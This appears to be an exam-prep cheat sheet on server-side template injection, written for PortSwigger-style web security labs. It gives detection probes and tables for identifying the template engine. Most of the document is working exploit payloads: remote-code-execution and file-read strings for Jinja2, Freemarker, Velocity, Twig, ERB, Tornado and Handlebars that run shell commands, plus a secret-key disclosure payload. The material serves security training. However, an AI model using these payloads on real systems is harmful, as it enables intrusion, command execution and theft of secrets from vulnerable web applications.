# SSTI (Server-Side Template Injection) - Stage 3

## 🎯 Target Location

**Primary Target:** Product details page - "Unfortunately this product is out of stock" message

## 🔍 Detection

### Template Expression Testing
Try these payloads to detect SSTI:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

**If you see `49` in response** → SSTI confirmed!

## 🔥 Identification

### Determine Template Engine

| Expression | Result | Likely Engine |
|------------|--------|---------------|
| `{{7*7}}` | `49` | Jinja2, Twig, Freemarker, Velocity |
| `${7*7}` | `49` | Freemarker, Velocity, Thymeleaf |
| `<%= 7*7 %>` | `49` | ERB (Ruby), ASP |
| `#{7*7}` | `49` | Thymeleaf |

**Use [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection) to narrow down the engine.**

## 🔥 Exploitation Payloads

### Jinja2 (Python)
**Read File:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
```

**Alternative:**
```python
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('/home/carlos/secret').read() }}
```

**RCE:**
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```

---

### Freemarker (Java)
**RCE:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```

**Alternative:**
```java
${"freemarker.template.utility.Execute"?new()("cat /home/carlos/secret")}
```

---

### Velocity (Java)
**RCE:**
```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

### Twig (PHP)
**RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
```

**Alternative:**
```php
{{['cat /home/carlos/secret']|filter('system')}}
```

---

### ERB (Ruby)
**RCE:**
```ruby
<%= system('cat /home/carlos/secret') %>
```

**Alternative:**
```ruby
<%= `cat /home/carlos/secret` %>
```

---

### Tornado (Python)
**RCE:**
```python
{% import os %}
{{ os.popen('cat /home/carlos/secret').read() }}
```

---

### Handlebars (JavaScript)
**RCE (Node.js):**
```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('cat /home/carlos/secret');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## 🎓 Exam Tips

1. **Test template expressions first** - `{{7*7}}`, `${7*7}`, etc.
2. **Use HackTricks** - Comprehensive SSTI payloads for all engines
3. **Check product details page** - "Out of stock" message is common location
4. **Try multiple engines** - If one doesn't work, try another
5. **Use Burp Scanner** - Can identify SSTI and suggest engine
6. **Exfiltrate via DNS** - If output not visible, use Burp Collaborator

## 🔍 Testing Workflow

1. **Detect SSTI:**
   ```
   {{7*7}} → Check if returns 49
   ```

2. **Identify Engine:**
   ```
   Try different expression syntaxes
   Use Burp Scanner
   Check error messages
   ```

3. **Exploit:**
   ```
   Use engine-specific RCE payload
   Read /home/carlos/secret
   ```

4. **Exfiltrate (if needed):**
   ```python
   {{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
   ```

## 📚 Lab Examples

### Lab 1: Basic SSTI
```
{{7*7}} → 49
```

### Lab 2: SSTI (Code Context)
**Context:** Already inside template expression
```
blog-post-author-display=user.name}}{{7*7
```

### Lab 3: Using Documentation
**Strategy:** Read template engine documentation to find RCE method

### Lab 4: Unknown Language with Documented Exploit
**Strategy:** Test multiple engines, use documented exploits

### Lab 5: Information Disclosure via User-Supplied Objects
**Payload:**
```python
{{settings.SECRET_KEY}}
```

### Lab 6: Admin Panel Password Reset Email SSTI
**Location:** Password reset email template
**Payload:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[396]('/home/carlos/secret').read() }}
```

## 🔗 Quick Reference

| Engine | Syntax | Common Framework |
|--------|--------|------------------|
| Jinja2 | `{{...}}` | Flask (Python) |
| Freemarker | `${...}` | Spring (Java) |
| Velocity | `#set(...)` | Java |
| Twig | `{{...}}` | Symfony (PHP) |
| ERB | `<%= ... %>` | Rails (Ruby) |
| Handlebars | `{{...}}` | Express (Node.js) |

## 📚 References

- [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
